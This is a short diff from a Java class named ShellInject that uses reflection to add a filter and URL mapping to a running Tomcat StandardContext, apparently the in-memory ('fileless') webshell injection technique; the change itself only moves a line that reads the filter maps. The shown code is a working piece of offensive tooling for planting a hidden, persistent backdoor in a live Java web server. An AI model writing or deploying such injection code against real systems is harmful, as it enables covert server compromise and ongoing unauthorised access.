@@ -31,13 +31,13 @@ public class ShellInject  {
             filterDef.setFilter(filter);
             standardContext.addFilterDef(filterDef);
             standardContext.filterStart();
-            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
             FilterMap filterMap = new FilterMap();
             filterMap.setFilterName(key);
             filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));
             filterMap.addURLPattern("/"+key);
             standardContext.addFilterMap(filterMap);
             Field filterMapsField = StandardContext.class.getDeclaredField("filterMaps");
+            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
             filterMapsField.setAccessible(true);
             Field arrayField = filterMapsField.get(standardContext).getClass().getDeclaredField("array");
             arrayField.setAccessible(true);
